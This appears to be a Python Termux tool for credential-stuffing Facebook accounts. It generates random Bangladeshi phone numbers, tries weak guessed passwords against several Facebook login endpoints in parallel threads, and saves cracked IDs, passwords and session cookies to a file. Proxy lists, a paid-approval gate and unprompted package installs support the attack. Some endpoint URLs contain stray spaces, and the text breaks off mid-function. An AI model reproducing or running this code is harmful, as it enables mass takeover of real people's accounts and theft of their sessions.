#Sc Make By Hasan
#github: KgHasan
#Gift By Hasan

import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
os.system('apt update')
os.system('clear')
os.system('apt upgrade')
os.system('clear')
os.system('pip install bs4')
os.system('clear')
os.system('pip install requests')
os.system('clear')
os.system('termux-setup-storage')
os.system('clear')
os.system('pip install rich')
os.system('clear')
print('')
print('')
print(' \033[38;5;46m SC MAKE BY ASRAFUL ISLAM HASAN \n  Github: KgHasan')
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
import os
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')

RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
#
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
#___Cuntry And Ip ____
desh = requests.get("http://ip-api.com/json/").json()["country"]
ip = requests.get("https://api.ipify.org").text
#____proxy_____
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
    
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
os.system('xdg-open https://facebook.com/groups/551365756758487/')
logo = ("""\033[38;5;6m
    ██   ██  █████  ███████  █████  ███    ██ 
    ██   ██ ██   ██ ██      ██   ██ ████   ██ 
    ███████ ███████ ███████ ███████ ██ ██  ██ 
    ██   ██ ██   ██      ██ ██   ██ ██  ██ ██ 
    ██   ██ ██   ██ ███████ ██   ██ ██   ████ 
         
 \033[38;5;6m╔════════════════════════════════════════════════╗
 \033[38;5;6m║     \033[38;5;195m[\033[38;5;45m✓\033[38;5;195m] \033[38;5;195mCREATED BY\033[38;5;196m   :  \033[38;5;146mASRAFUL ISLAM HASAN    \033[38;5;6m║
 \033[38;5;6m║     \033[38;5;195m[\033[38;5;45m✓\033[38;5;195m] \033[38;5;195mFACEBOK      \033[38;5;196m: \033[38;5;146m Hasa N                 \033[38;5;6m║
 \033[38;5;6m║     \033[38;5;195m[\033[38;5;45m✓\033[38;5;195m] \033[38;5;195mGITHUB       \033[38;5;196m:  \033[38;5;146mKgHasan                \033[38;5;6m║
 \033[38;5;6m║     \033[38;5;195m[\033[38;5;45m✓\033[38;5;195m] \033[38;5;195mTOOL STATUS  \033[38;5;196m: \033[38;5;146m Mix Clone              \033[38;5;6m║
 \033[38;5;6m║     \033[38;5;195m[\033[38;5;45m✓\033[38;5;195m] \033[38;5;195mTEAM         \033[38;5;196m:  \033[38;5;146mKST                    \033[38;5;6m║
 \033[38;5;6m║     \033[38;5;195m[\033[38;5;45m✓\033[38;5;195m] \033[38;5;195mTOOL VIRSION \033[38;5;196m:  \033[38;5;146m3.03                   \033[38;5;6m║
 \033[38;5;6m╚════════════════════════════════════════════════╝
 \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195m PLZ SAPPORT ME BRO....
 \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195m HASAN TERMUX HELPING ZONE....
 \033[38;5;6m══════════════════════════════════════════════════
    """)
balpakna =(""" \033[38;5;6m══════════════════════════════════════════════════""")    
meyermarexudi =(""" \033[38;5;191m══════════════════════════════════════════════════""")    
alltimexudi =(""" \33[1;32mONLY FREE APPROVAL SYSTEM 7 DEYS FREE APPROVAL""")
xudartimenai =(""" \033[1;92mCONTACT ADMIN PLZ ENTAR""")
fuckyoursali =(""" \33[1;32mYour Token is Successfully Approved""")
xudinaministar =(""" \33[1;32mImportent Note """)
hedaborakarent =(""" \33[1;32mFuck ByPasar Chake Your Data """)
#____APPROVAL SYSTEM ADD_____#
def meyexudi():
  os.system('clear')
  print(logo)
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://raw.githubusercontent.com/Facebook-12/aproval/main/Aprove2').text
    if id in httpCaht:
      print(fuckyoursali)
      print(hedaborakarent)
      msg = str(os.geteuid())
      #time.sleep(0.5)
      print()
      pass
    else:
      print(meyermarexudi)
      print(" \033[1;92mYour Kay : "+id)
      print(meyermarexudi)
      print(xudinaministar)
      print(meyermarexudi)
      print(alltimexudi)
      print(meyermarexudi)
      print(xudartimenai)
      print(meyermarexudi)
      input(' \33[1;32mIF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801309421298?text='+tks),approval()
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
meyexudi()
def naima():
	print('-------------------')
# 
#   
def Heda():
        os.system("clear")
        #1nd
        print(logo)
        print(balpakna)
        print(" \033[38;5;195m[1] \033[1;92mRANDOM BD")
        print(" \033[38;5;195m[2] \033[1;92mRANDOM PK/BD")
        print(" \033[38;5;195m[3] \033[1;92mCONTACT ADMIN")
        print(" \033[38;5;195m[0] \033[1;91mExit")
        print(balpakna)
        Sumaiya =input(" \033[38;5;195m[•] \033[1;92m Choose\033[1;91m : \033[1;92m")
        if Sumaiya in ["1","01"]:
            fuck()
        if Sumaiya in ["2","02"]:
        	habibi()
        if Sumaiya in ["3","03"]:
        	os.system('xdg-open https://www.facebook.com/copy.link.erorr404')
        	Heda()
        if Sumaiya in [" 0", "00"]:
            exit()
        else:
            exit() 


def samiya(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :shanto = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :shanto = ' • 2009'
        elif uid[:8] in ['10000000']        :shanto = ' • 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:shanto = ' • 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:shanto = ' 2010'
        elif uid[:6] in ['100001']          :shanto = ' • 2010/2011'
        elif uid[:6] in ['100002','100003'] :shanto = ' • 2011/2012'
        elif uid[:6] in ['100004']          :shanto = ' • 2012/2013'
        elif uid[:6] in ['100005','100006'] :shanto = ' • 2013/2014'
        elif uid[:6] in ['100007','100008'] :shanto = ' • 2014/2015'
        elif uid[:6] in ['100009']          :shanto = ' • 2015'
        elif uid[:5] in ['10001']           :shanto = ' • 2015/2016'
        elif uid[:5] in ['10002']           :shanto = ' • 2016/2017'
        elif uid[:5] in ['10003']           :shanto = ' • 2018/2019'
        elif uid[:5] in ['10004']           :shanto = ' • 2019/2020'
        elif uid[:5] in ['10005']           :shanto = ' • 2020'
        elif uid[:5] in ['10006','10007','']:shanto = ' • 2021'
        elif uid[:5] in ['10008']           :shanto = ' • 2022'
        elif uid[:5] in ['10009']           :shanto = ' • 2023'
        else:shanto=''
    elif len(uid) in [9,10]:
        shanto = '  • 2008/2009'
    elif len(uid)==8:
        shanto = ' • 2007/2008'
    elif len(uid)==7:
        shanto = ' • 2006/2007'
    else:shanto=''
    return shanto

        
def fuck():
    user=[]
    os.system('clear')
    print(logo)
    print(' \033[38;5;195m[•] \033[1;96mEXAMPLE : \033[1;92m017\033[38;5;195m/\033[1;92m018\033[38;5;195m/\033[1;92m019\033[38;5;195m/\033[1;92m016')
    print(balpakna)
    ha = input(' \033[38;5;195m[•] \033[1;96mCHOICE SIM CODE : \033[1;92m')
    prity=[]
    if ha in ['017']:
    	prity.append('Bangladesh Grameenphone')
    elif ha in ['019']:
    	prity.append('Bangladesh Banglalink')
    elif ha in ['018']:
    	prity.append('Bangladesh Robi')
    elif ha in ['016']:
    	prity.append('Bangladesh Airtel')
    else:
    	prity.append('Bangladesh Grameenphone')
    os.system('clear')
    print(logo)
    print(" \033[38;5;195m[•] \033[1;96m Example : \033[1;92mfreefire, \033[1;94mbangladesh , \033[1;95m11223344, \033[1;92mEnc ")
    print(balpakna)
    po = input(f' \033[38;5;195m[•] \033[1;96m CHOOSE YOUR PASSWORD :{H} ')
    pok = po.lower()
    os.system('clear')
    print(logo)
    print(" \033[1;97m[1] \033[1;94mMATHOID \033[1;93m[ P ] \n \033[1;97m[2] \033[1;94mMATHOID \033[1;93m[X] \n \033[1;97m[3] \033[1;94mMATHOID \033[1;93m[Mbasic] \n \033[1;97m[4] \033[1;94mMATHOID \033[1;93m[Free] \n \033[1;97m[5] \033[1;94mMATHOID \033[1;93m[Web]\n \033[1;97m[6] \033[1;94mMATHOID\033[1;93m [M] ")
    print(balpakna)
    ha = input(' \033[38;5;195m[•] \033[1;96m CHOICE MATHOID \033[1;97m: \033[1;92m')
    nabil=[]
    if ha in ['1', '01']:
    	nabil.append('M1')
    elif ha in ['2', '02']:
    	nabil.append('M2')
    elif ha in ['3', '03']:
    	nabil.append('M3')
    elif ha in ['4', '04']:
    	nabil.append('M4')
    elif ha in ['5', '05']:
    	nabil.append('M5')
    elif ha in ['6', '06']:
    	nabil.append('M6')
    else:
    	nabil.append('M1')
    os.system('clear')
    print(logo)
    print(' \033[38;5;195m[•] \033[1;96mEXAMPLE : \033[1;92m10000\033[38;5;195m/\033[1;92m20000\033[38;5;195m/\033[1;92m30000\033[38;5;195m/\033[1;92m50000 ')
    print(balpakna)
    limit = int(input(' \033[38;5;195m[•] \033[1;96mCLONING LIMIT : \033[1;92m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=30) as asha:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        sanjida=prity[0]
        print(balpakna)
        kadija=nabil[0]
        print(' \033[38;5;195m[•]\033[1;92m MATHOID\033[1;95m          : \033[1;97m'+kadija)
        print(' \033[38;5;195m[•]\033[1;92m COUNTRY\033[1;95m          : \033[1;97m'+desh)
        print(f" \033[38;5;195m[•] \033[1;92mIP ADDRES        \033[1;95m: \033[1;97m"+ip)
        print(f' \033[38;5;195m[•] \033[1;92mOPARETIOR NAME   \033[1;95m: \033[1;97m'+sanjida)
        print(f' \033[38;5;195m[•] \033[1;92mCLONING LIMIT   \033[1;95m : \033[1;97m'+tl)
        #print(f' \033[38;5;195m[•] \033[1;92mCHOICE SIM CODE \033[1;95m : \033[1;97m'+ha)
        print(f' \033[38;5;195m[•] \x1b[1;91mUSE AIRPLANE MODE FOR BETTER RESULT')
        print(balpakna)
        for love in user:
            pwx = [(ha+love), (pok), (love), ("bangladesh","freefire","freefirelover","pubglover")]
            uid = ha+love
            if 'M1' in nabil:
            	asha.submit(HASAN,uid,pwx,tl)
            elif 'M2' in nabil:
            	asha.submit(XUDI,uid,pwx,tl)
            elif 'M3' in nabil:
            	asha.submit(SORNA,uid,pwx,tl)
            elif 'M4' in nabil:
            	asha.submit(XXX,uid,pwx,tl)
            elif 'M5' in nabil:
            	asha.submit(SATTAR,uid,pwx,tl)
            elif 'M6' in nabil:
            	asha.submit(MUNNI,uid,pwx,tl)
            else:
            	asha.submit(XUDI,uid,pwx,tl)
    #print(balpakna)
    #print(' [✓] WORK IS DONE BABE')
    #print(' [✓] Ids saved in HASAN-OK.txt,-CP.txt')
    #print(balpakna)
    
#_____[M1 P-Facebook]______#
def HASAN(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            max = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r \033[1;90m[\033[1;92mHASAN-M1\033[1;90m]-[\033[1;96m%s-%s\033[1;90m]-[\033[1;92mOK:%s\033[1;90m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            #_____Mathoid______#
            header_freefb = {'authority': 'p.facebook.com',
           'method': 'POST',
           'schem': 'https',
           'accept': '*/*',
           'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
           'content-type': 'application/x-www-form-urlencoded',
           # 'cookie': 'datr=ULBQZOq4O4vkj1LFZs-XzTn1; sb=ULBQZMfuCJJx0lCgGuUlV4zg; m_pixel_ratio=1.75; sfiu=AYhuILXKOO7Ht-c87qiCCnh6cLZlUXPKkH-ld4Dv3r9NadPc7ApwR3naYd4PGAkexnDHlr8_ZRgp_HFJcQYa6_NjrwglFDHC2nvfmtSuR_vDqNSaZR5hYE7n2J1ZBOBKRyl5iz2xSC0bzI6IBG7g2dExmWo5U1uncR2lyDoLoF8L2iBmhhocvfhzxz8dovL1ytWzZXwsOaHhS1SscApNRU9qoOH5YwdD_8Wb671fosCDEw; wd=412x785; x-referer=eyJyIjoiLyIsImgiOiIvIiwicyI6InAifQ%3D%3D; fr=0pDrj7bNh6Yx8ears..BkULBQ.mP.AAA.0.0.BkULHh.AWUiPDdsjd8',
           'origin': 'https://p.facebook.com',
           'referer': 'https://p.facebook.com/',
           'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="112", "Google Chrome";v="112"',
           'sec-ch-ua-mobile': '?0',
           'sec-ch-ua-platform': '"Windows"',
           'sec-fetch-dest': 'empty',
           'sec-fetch-mode': 'cors',
           'sec-fetch-site': 'same-origin',
           'user-agent': 'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5629.220 Safari/537.36',
           'x-asbd-id': '198387',
           'x-fb-lsd': 'AVrnx9O0Ff0',
           'x-requested-with': 'XMLHttpRequest',
           'x-response-format': 'JSONStream',
}
            lo = session.post('https://p. facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=1 00',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print(f" \033[38;5;126m══════════════════════════════════════════════════\n \x1b[1;32m[HASAN-OK]\033[38;5;45m>\033[1;92m {cid} - {ps}          ")
                print(f" \x1b[1;32m[NUMBAR]\033[38;5;45m> {uid} ")
                #print(f" \x1b[1;32m[CREACT DATE]\033[38;5;45m> '+samiya(uid)+'\033[1;92m")
                print(f" \033[1;92m[COOKIES]\033[38;5;45m> \033[1;96m{coki}")
                open('/sdcard/HASAN-OK.txt', 'a').write( cid+' | '+uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #print(f" \x1b[1;30m[HASAN-💔] {uid} | {ps}   ")
                #print(f" \x1b[1;32m[NUMBAR-🤙] {cid} - {ids} ")
                #print(f"\033[1;92m=[]=COOKIES : {coki}")
                #open('/sdcard/HASAN-cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass

#____[M2-X Facebook]_____#        
def XUDI(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            max = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r \033[1;90m[\033[1;92mHASAN-M2\033[1;90m]-[\033[1;96m%s-%s\033[1;90m]-[\033[1;92mOK:%s\033[1;90m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            #_____Mathoid______#
            header_freefb = {'authority': 'p.facebook.com',
           'method': 'POST',
           'schem': 'https',
           'accept': '*/*',
           'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
           'content-type': 'application/x-www-form-urlencoded',
           # 'cookie': 'datr=ULBQZOq4O4vkj1LFZs-XzTn1; sb=ULBQZMfuCJJx0lCgGuUlV4zg; m_pixel_ratio=1.75; sfiu=AYhuILXKOO7Ht-c87qiCCnh6cLZlUXPKkH-ld4Dv3r9NadPc7ApwR3naYd4PGAkexnDHlr8_ZRgp_HFJcQYa6_NjrwglFDHC2nvfmtSuR_vDqNSaZR5hYE7n2J1ZBOBKRyl5iz2xSC0bzI6IBG7g2dExmWo5U1uncR2lyDoLoF8L2iBmhhocvfhzxz8dovL1ytWzZXwsOaHhS1SscApNRU9qoOH5YwdD_8Wb671fosCDEw; wd=412x785; x-referer=eyJyIjoiLyIsImgiOiIvIiwicyI6InAifQ%3D%3D; fr=0pDrj7bNh6Yx8ears..BkULBQ.mP.AAA.0.0.BkULHh.AWUiPDdsjd8',
           'origin': 'https://p.facebook.com',
           'referer': 'https://p.facebook.com/',
           'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="112", "Google Chrome";v="112"',
           'sec-ch-ua-mobile': '?0',
           'sec-ch-ua-platform': '"Windows"',
           'sec-fetch-dest': 'empty',
           'sec-fetch-mode': 'cors',
           'sec-fetch-site': 'same-origin',
           'user-agent': 'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5629.220 Safari/537.36',
           'x-asbd-id': '198387',
           'x-fb-lsd': 'AVrnx9O0Ff0',
           'x-requested-with': 'XMLHttpRequest',
           'x-response-format': 'JSONStream',
}
            lo = session.post('https://p. facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=1 00',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print(f" \033[38;5;126m══════════════════════════════════════════════════\n \x1b[1;32m[HASAN-OK]\033[38;5;45m>\033[1;92m {cid} - {ps}          ")
                print(f" \x1b[1;32m[NUMBAR]\033[38;5;45m> {uid} ")
                #print(f" \x1b[1;32m[CREACT DATE]\033[38;5;45m> '+samiya(uid)+'\033[1;92m")
                print(f" \033[1;92m[COOKIES]\033[38;5;45m> \033[1;96m{coki}")
                open('/sdcard/HASAN-OK.txt', 'a').write( cid+' | '+uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #print(f" \x1b[1;30m[HASAN-💔] {uid} | {ps}   ")
                #print(f" \x1b[1;32m[NUMBAR-🤙] {cid} - {ids} ")
                #print(f"\033[1;92m=[]=COOKIES : {coki}")
                #open('/sdcard/HASAN-cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
 
 #____[M3-Mbasic-Facebook]_____#        
def SORNA(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            max = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r \033[1;90m[\033[1;92mHASAN-M3\033[1;90m]-[\033[1;96m%s-%s\033[1;90m]-[\033[1;92mOK:%s\033[1;90m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            #_____Mathoid______#
            header_freefb = {'authority': 'mbasic.facebook.com',
           'method': 'GET',
           'schem': 'https',
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
           'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
           'cache-control': 'max-age=0',
           # 'cookie': 'datr=ULBQZOq4O4vkj1LFZs-XzTn1; sb=ULBQZMfuCJJx0lCgGuUlV4zg; m_pixel_ratio=1.75; sfiu=AYhuILXKOO7Ht-c87qiCCnh6cLZlUXPKkH-ld4Dv3r9NadPc7ApwR3naYd4PGAkexnDHlr8_ZRgp_HFJcQYa6_NjrwglFDHC2nvfmtSuR_vDqNSaZR5hYE7n2J1ZBOBKRyl5iz2xSC0bzI6IBG7g2dExmWo5U1uncR2lyDoLoF8L2iBmhhocvfhzxz8dovL1ytWzZXwsOaHhS1SscApNRU9qoOH5YwdD_8Wb671fosCDEw; x-referer=eyJyIjoiLyIsImgiOiIvIiwicyI6InAifQ%3D%3D; wd=412x785; fr=0pDrj7bNh6Yx8ears..BkULBQ.mP.AAA.0.0.BkULeV.AWUjv1vsACU',
           'referer': 'https://mbasic.facebook.com/login/?email=01762628196&li=Zr5QZBb8ZO43c6pDhNHUdUmn&e=1348028&shbl=1&refsrc=deprecated&_rdr',
           'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
           'sec-ch-ua-mobile': '?0',
           'sec-ch-ua-platform': '"Linux"',
           'sec-fetch-dest': 'document',
           'sec-fetch-mode': 'navigate',
           'sec-fetch-site': 'same-origin',
           'sec-fetch-user': '?1',
           'upgrade-insecure-requests': '1',
           'user-agent': 'Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/114.0.5660.215 Chrome/114.0.5660.215 Safari/537.36',
}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print(f" \033[38;5;126m══════════════════════════════════════════════════\n \x1b[1;32m[HASAN-OK]\033[38;5;45m>\033[1;92m {cid} - {ps}          ")
                print(f" \x1b[1;32m[NUMBAR]\033[38;5;45m> {uid} ")
                print(f" \x1b[1;32m[CREACT DATE]\033[38;5;45m> '+samiya(uid)+'\033[1;92m")
                print(f" \033[1;92m[COOKIES]\033[38;5;45m> \033[1;96m{coki}")
                open('/sdcard/HASAN-OK.txt', 'a').write( cid+' | '+uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #print(f" \x1b[1;30m[HASAN-💔] {uid} | {ps}   ")
                #print(f" \x1b[1;32m[NUMBAR-🤙] {cid} - {ids} ")
                #print(f"\033[1;92m=[]=COOKIES : {coki}")
                #open('/sdcard/HASAN-cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
#____[M4-free Facebook]_____#        
def XXX(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            max = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r \033[1;90m[\033[1;92mHASAN-M4\033[1;90m]-[\033[1;96m%s-%s\033[1;90m]-[\033[1;92mOK:%s\033[1;90m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            #_____Mathoid______#
            header_freefb = {'authority': 'free.facebook.com',
          'method': 'GET',
          'schem': 'https',
          'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
          'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
          'cache-control': 'max-age=0',
          # 'cookie': 'datr=ULBQZOq4O4vkj1LFZs-XzTn1; sb=ULBQZMfuCJJx0lCgGuUlV4zg; m_pixel_ratio=1.75; sfiu=AYhuILXKOO7Ht-c87qiCCnh6cLZlUXPKkH-ld4Dv3r9NadPc7ApwR3naYd4PGAkexnDHlr8_ZRgp_HFJcQYa6_NjrwglFDHC2nvfmtSuR_vDqNSaZR5hYE7n2J1ZBOBKRyl5iz2xSC0bzI6IBG7g2dExmWo5U1uncR2lyDoLoF8L2iBmhhocvfhzxz8dovL1ytWzZXwsOaHhS1SscApNRU9qoOH5YwdD_8Wb671fosCDEw; x-referer=eyJyIjoiLyIsImgiOiIvIiwicyI6InAifQ%3D%3D; wd=412x785; fr=0pDrj7bNh6Yx8ears..BkULBQ.mP.AAA.0.0.BkUMSe.AWXL7O3xDFg',
          'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '"Linux"',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'none',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1',
          'user-agent': 'Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5618.199 Safari/537.36',
}
            lo = session.post('https://www.facebook.com/login/device-based/login/async/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print(f" \033[38;5;126m══════════════════════════════════════════════════\n \x1b[1;32m[HASAN-OK]\033[38;5;45m>\033[1;92m {cid} - {ps}          ")
                print(f" \x1b[1;32m[NUMBAR]\033[38;5;45m> {uid} ")
                print(f" \x1b[1;32m[CREACT DATE]\033[38;5;45m> '+samiya(uid)+'\033[1;92m")
                print(f" \033[1;92m[COOKIES]\033[38;5;45m> \033[1;96m{coki}")
                open('/sdcard/HASAN-OK.txt', 'a').write( cid+' | '+uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #print(f" \x1b[1;30m[HASAN-💔] {uid} | {ps}   ")
                #print(f" \x1b[1;32m[NUMBAR-🤙] {cid} - {ids} ")
                #print(f"\033[1;92m=[]=COOKIES : {coki}")
                #open('/sdcard/HASAN-cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
#____[M5-Web Facebook]_____#        
def SATTAR(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            max = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r \033[1;90m[\033[1;92mHASAN-M5\033[1;90m]-[\033[1;96m%s-%s\033[1;90m]-[\033[1;92mOK:%s\033[1;90m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://www.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            #_____Mathoid______#
            header_freefb = {'authority': 'web.facebook.com',
            'method': 'GET',
